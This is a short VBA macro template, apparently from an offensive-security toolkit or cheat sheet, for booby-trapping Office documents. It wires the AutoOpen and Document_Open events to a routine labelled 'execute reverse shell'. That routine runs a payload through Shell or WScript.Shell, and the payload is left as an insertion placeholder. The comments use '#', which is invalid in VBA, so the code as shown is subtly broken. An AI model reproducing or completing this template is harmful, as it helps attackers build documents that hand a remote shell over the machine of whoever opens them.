# auto-exec macro when new doc is opened
Sub AutoOpen()
    exploit
End Sub
# auto-exec macro when existing doc is re-opened
Sub Document_Open()
    exploit
End Sub
# execute reverse shell
Sub exploit()
        Dim str As String
        # {insert_payload_here}
        # OPTION 1
        Shell (Str)                    
        # OPTION 2
        # CreateObject("Wscript.Shell").Run str
End Sub
